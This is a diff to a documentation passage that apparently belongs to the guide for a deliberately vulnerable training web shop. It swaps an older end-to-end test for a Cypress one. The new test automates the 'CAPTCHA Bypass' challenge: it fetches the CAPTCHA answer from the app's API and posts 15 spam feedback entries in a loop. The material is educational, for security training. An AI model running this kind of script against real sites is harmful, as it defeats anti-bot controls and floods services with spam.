@@ -483,37 +483,48 @@ The latter is actually the way it is implemented in the end-to-end test
 for this challenge:
 
 ```javascript
-  let comment, rating, submitButton, captcha
-
-  beforeEach(() => {
-    browser.get('/#/contact')
-    comment = element(by.id('comment'))
-    rating = $$('.br-unit').last()
-    captcha = element(by.id('captchaControl'))
-    submitButton = element(by.id('submitButton'))
-    solveNextCaptcha()
-  })
-
   describe('challenge "captchaBypass"', () => {
-    it('should be possible to post 10 or more customer feedbacks in less than 10 seconds', () => {
-      for (var i = 0; i < 11; i++) {
-        comment.sendKeys('Spam #' + i)
-        rating.click()
-        submitButton.click()
-        browser.sleep(200)
-        solveNextCaptcha() // first CAPTCHA was already solved in beforeEach
-      }
-    })
+   it('should be possible to post 10 or more customer feedbacks in less than 20 seconds', () => {
+      cy.window().then(async () => {
+         for (let i = 0; i < 15; i++) {
+            const response = await fetch(
+                    `${Cypress.env('baseUrl')}/rest/captcha/`,
+                    {
+                       method: 'GET',
+                       headers: {
+                          'Content-type': 'text/plain'
+                       }
+                    }
+            )
+            if (response.status === 200) {
+               const responseJson = await response.json()
 
-    protractor.expect.challengeSolved({ challenge: 'CAPTCHA Bypass Tier 1' })
-  })
+               await sendPostRequest(responseJson)
+            }
 
-  function solveNextCaptcha () {
-    element(by.id('captcha')).getText().then((text) => {
-      const answer = eval(text).toString() // eslint-disable-line no-eval
-      captcha.sendKeys(answer)
-    })
-  }
+            async function sendPostRequest (captcha: {
+               captchaId: number
+               answer: string
+            }) {
+               await fetch(`${Cypress.env('baseUrl')}/api/Feedbacks`, {
+                  method: 'POST',
+                  cache: 'no-cache',
+                  headers: {
+                     'Content-type': 'application/json'
+                  },
+                  body: JSON.stringify({
+                     captchaId: captcha.captchaId,
+                     captcha: `${captcha.answer}`,
+                     comment: `Spam #${i}`,
+                     rating: 3
+                  })
+               })
+            }
+         }
+      })
+      cy.expectChallengeSolved({ challenge: 'CAPTCHA Bypass' })
+   })
+})
 ```
 
 _It is worth noting that both alternate solutions would still work even
